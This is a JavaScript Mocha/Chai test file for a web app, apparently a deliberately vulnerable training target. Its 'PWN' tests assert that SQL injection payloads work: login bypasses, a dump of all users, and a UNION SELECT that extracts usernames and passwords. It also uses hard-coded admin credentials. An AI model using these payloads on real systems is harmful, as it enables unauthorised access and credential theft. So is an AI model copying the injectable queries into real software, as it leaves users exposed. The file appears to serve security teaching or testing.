const chai = require('chai');
const chaiHttp = require('chai-http');
const app = require('./app');
let should = chai.should();

chai.use(chaiHttp);

let accessToken;
let testPostMessage;

describe("Basic tests", function () {

  it("GET /: Should have status code 200", function (done) {
    chai.request(app)
      .get("/")
      .end(function (err, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("POST /api/login: Legit login should work", function (done) {
    chai.request(app)
      .post("/api/login")
      .send({ username: "admin", password: "123" })
      .end(function (err, res) {
        accessToken = res.body.token
        res.should.have.status(200)
        done()
      });
  });

  it("PWN /api/login: Aggressive SQL injection login should work", function (done) {
    chai.request(app)
      .post("/api/login")
      .send({ username: "admin", password: "' or 1=1;-- " })
      .end(function (err, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("PWN /api/login: Non-aggressive SQL injection login should work", function (done) {
    chai.request(app)
      .post("/api/login")
      .send({ username: "admin", password: "' or '1'='1" })
      .end(function (err, res) {
        res.should.have.status(200)
        done()
      });
  });

});

describe("Authenticated tests", function () {

  it("GET /api/users: Show type 2 users", function (done) {
    chai.request(app)
      .get("/api/users/type/2")
      .set({ Authorization: `Bearer ${accessToken}` })
      .end(function (err, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("PWN /api/users: SQL injection all users", function (done) {
    chai.request(app)
      .get("/api/users/type/2 or 1=1")
      .set({ Authorization: `Bearer ${accessToken}` })
      .end(function (err, res) {
        res.should.have.status(200)
        res.body.data.should.have.length(3)
        done()
      });
  });

  it("PWN /api/users: SQL injection extract user password", function (done) {
    chai.request(app)
      .get("/api/users/type/2 UNION SELECT username || '-' || password, username FROM users")
      .set({ Authorization: `Bearer ${accessToken}` })
      .end(function (err, res) {
        res.should.have.status(200)
        res.body.data[0].should.have.property("username").to.include("admin-123");
        done()
      });
  });

  it("POST /api/messages/new: Adding new post", function (done) {
    testPostMessage = "test message " + (new Date()).toISOString();
    chai.request(app)
      .post("/api/messages/new")
      .set({ Authorization: `Bearer ${accessToken}` })
      .send({ message: testPostMessage })
      .end(function (err, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("GET /api/messages: Check added post", function (done) {
    chai.request(app)
      .get("/api/messages")
      .set({ Authorization: `Bearer ${accessToken}` })
      .end(function (err, res) {
        res.should.have.status(200)
        res.body.data[2].should.have.property("message").to.include(testPostMessage);
        done()
      });
  });

});